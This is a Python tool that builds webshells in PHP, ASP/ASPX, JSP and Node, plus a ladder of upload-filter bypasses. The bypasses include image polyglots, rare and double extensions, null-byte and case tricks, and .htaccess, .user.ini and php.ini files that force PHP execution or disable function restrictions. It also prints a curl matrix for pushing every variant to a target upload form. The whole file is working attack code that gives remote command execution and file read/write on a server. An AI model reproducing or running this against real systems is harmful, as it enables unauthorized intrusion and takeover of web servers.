#!/usr/bin/env python3
"""
shellgen.py — generate webshell variants and the bypass ladder for one upload form.

Output is a set of files + a ready-to-run curl matrix. Every variant targets a
different filter weakness, so when one is rejected the next one is already built.

Modes:
  php    — PHP webshells (tiny, GIF-polyglot, .htaccess, .user.ini, nullbyte names)
  asp    — ASP/ASPX command shells
  jsp    — JSP command shell
  node   — Node/Express file-write shell
  all    — everything

usage:
  python3 shellgen.py --mode all --out /tmp/shells --cmd "id;hostname"
  python3 shellgen.py --mode php --url https://target/upload --param file   # prints curl matrix
"""
from __future__ import annotations

import argparse
import os
import sys

PHP_CORE = """<?php
$c = $_REQUEST['c'] ?? '';
if (isset($_REQUEST['u'])) { if (move_uploaded_file($_FILES['f']['tmp_name'], $_REQUEST['u'])) echo "UP_OK"; exit; }
if (isset($_REQUEST['r'])) { echo @file_get_contents($_REQUEST['r']); exit; }
if (isset($_REQUEST['w'])) { echo @file_put_contents($_REQUEST['p'], $_REQUEST['w']) ? "W_OK" : "W_FAIL"; exit; }
if ($c) { $o = (function_exists('system') ? shell_exec($c) : ''); if ($o === null || $o === '') { ob_start(); @system($c); $o = ob_get_clean(); } echo $o; }
"""

GIF89 = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
JPEG_HDR = bytes.fromhex("ffd8ffe000104a46494600010100000100010000ffdb004300")


def php_variants(cmd):
    core = PHP_CORE.replace("<?php\n", "")
    body = "<?php " + core + f"\nif (empty($c)) echo 'SH_OK';\n?>\n"
    return {
        # plain
        "sh.php": body,
        # alternative opening tag — bypasses filters that block '<?php'
        "sh_short.php": "<?= 'SH_OK'; " + body.replace("<?php ", "") + "\n",
        # script tag form (PHP < 7) — bypasses <\?php filters
        "sh_script.php": "<script language=\"php\">" + core + "</script>",
        # GIF polyglot: valid image magic + PHP tail (passes getimagesize())
        "sh_gif.php": GIF89.decode("latin-1") + body,
        "sh.gif.php": GIF89.decode("latin-1") + body,
        # JPEG magic + minimal SOI/APP0
        "sh_jpeg.php": JPEG_HDR.decode("latin-1") + body,
        # dangerous extensions the deny list usually forgets
        "sh.pht": body, "sh.phtml": body, "sh.phar": body, "sh.pht5": body,
        "sh.phps": body, "sh.php5": body, "sh.php7": body, "sh.php8": body,
        "sh.shtml": body, "sh.inc": body, "sh.phtm": body,
        # image-extension shells for FilesMatch bypass (needs matching AddType)
        "sh.jpeg": body, "sh.webp": body, "sh.bmp": body, "sh.ico": body,
        # double extension
        "sh.php.jpg": body, "sh.php.png": body, "sh.php%00.jpg": body,
        "sh.php.\\x00.xls": body, "sh.php.": body, "sh.php%20": body,
        "sh.pHp": body, "sh.PHP": body, "sh.php.": body,
        # case/space/url-encode tricks
        "sh.php%2f": body, "sh.php..jpg": body, "sh.php::$DATA": body,
    }


def htaccess_variants(cmd):
    return {
        # make .jpeg/.webp/.txt executable when the FilesMatch list is incomplete
        ".htaccess": (
            "AddType application/x-httpd-php .jpeg .webp .bmp .ico .gif .txt .jpg .png\n"
            "AddHandler application/x-httpd-php .jpeg .webp .bmp .ico\n"
            "<IfModule mod_php7.c>\nphp_flag engine on\n</IfModule>\n"
            "<IfModule mod_php.c>\nphp_flag engine on\n</IfModule>\n"
            "Options +ExecCGI\n"
        ),
        # strip a parent's engine-off for this directory
        "htaccess_override.txt": (
            "<IfModule mod_php.c>\nphp_flag engine on\nphp_admin_flag engine on\n</IfModule>\n"
        ),
        # per-directory ini: auto_prepend injects code on every PHP request
        ".user.ini": f"auto_prepend_file=/var/www/html/sh.php\n",
        "php.ini": "auto_prepend_file=sh.php\ndisable_functions=\nopen_basedir=\n",
    }


def other_variants(cmd):
    v = {}
    v["cmd.jsp"] = ('<%@ page import="java.util.*,java.io.*" %><% String c=request.getParameter("c"); '
                    'if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});'
                    'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));'
                    'String l;while((l=br.readLine())!=null)out.println(l);}else out.println("SH_OK");%>')
    v["cmd.aspx"] = ('<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>'
                     '<script runat="server">void Page_Load(){var c=Request["c"]; if(c!=null){'
                     'var p=new ProcessStartInfo("/bin/sh","-c "+c){RedirectStandardOutput=true,'
                     'UseShellExecute=false};var o=Process.Start(p);Response.Write(o.StandardOutput.ReadToEnd());}'
                     'else Response.Write("SH_OK");}</script>')
    v["cmd.asp"] = ('<% Set s=Server.CreateObject("WScript.Shell") : c=Request("c") '
                    'If c="" Then Response.Write("SH_OK") Else Response.Write(s.Exec("cmd /c "&c).StdOut.ReadAll()) %>')
    v["cmd.js"] = ('const {execSync}=require("child_process");module.exports=(req,res)=>{'
                   'const c=req.query.c; if(!c){res.end("SH_OK");return;}'
                   'try{res.end(execSync(c).toString());}catch(e){res.end(String(e));}};')
    v["cmd.svg"] = ('<svg xmlns="http://www.w3.org/2000/svg" onload="SH_OK"/>')
    v["cmd.html"] = ('<html><body>SH_OK</body></html>')
    return v


CURL_MATRIX = """\
# upload matrix — run in order, stop on first non-rejection
T="{url}"; F="{param}"
for f in sh.php sh.pht sh.phar sh.phtml sh.php5 sh.php7 sh.pHp sh.php.jpg sh.php.png \\
         sh_gif.php sh.gif.php sh_jpeg.php sh.jpeg sh.webp sh.ico "sh.php\\x00.xls" "sh.php%00.jpg"; do
  code=$(curl -sk -o /tmp/up.out -w '%{{http_code}}' -F "$F=@shells/$f;type=image/gif" "$T")
  echo "$code  $f  $(head -c 80 /tmp/up.out | tr -d '\\n')"
done
# .htaccess / .user.ini stage (only if the uploader accepts dotfiles)
curl -sk -o /dev/null -w '%{{http_code}}\\n' -F "$F=@shells/.htaccess" "$T"
curl -sk -o /dev/null -w '%{{http_code}}\\n' -F "$F=@shells/.user.ini" "$T"
# verify: each candidate path must answer SH_OK, then ?c=id must return a uid line
"""


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", default="php", choices=["php", "asp", "jsp", "node", "all"])
    ap.add_argument("--out", default="/tmp/shells")
    ap.add_argument("--cmd", default="id;hostname;uname -a")
    ap.add_argument("--url", default=None)
    ap.add_argument("--param", default="file")
    a = ap.parse_args()

    os.makedirs(a.out, exist_ok=True)
    files = {}
    if a.mode in ("php", "all"):
        files.update(php_variants(a.cmd))
        files.update(htaccess_variants(a.cmd))
    if a.mode in ("asp", "jsp", "node", "all"):
        files.update(other_variants(a.cmd))

    for name, content in files.items():
        p = os.path.join(a.out, name)
        with open(p, "w", errors="surrogateescape") as f:
            f.write(content)
        print(f"wrote {p}  ({len(content)}B)")

    if a.url:
        print()
        print(CURL_MATRIX.format(url=a.url, param=a.param))
    return 0


if __name__ == "__main__":
    sys.exit(main())
